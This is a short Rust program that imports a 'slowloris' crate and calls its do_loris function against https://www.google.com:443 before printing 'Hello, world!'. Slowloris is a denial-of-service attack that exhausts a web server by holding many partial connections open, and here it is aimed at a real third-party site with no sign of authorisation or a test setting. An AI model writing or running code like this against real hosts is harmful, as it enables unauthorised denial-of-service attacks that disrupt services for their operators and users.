extern crate slowloris;

fn main() {
    slowloris::do_loris("https://www.google.com:443");
    println!("Hello, world!");
}
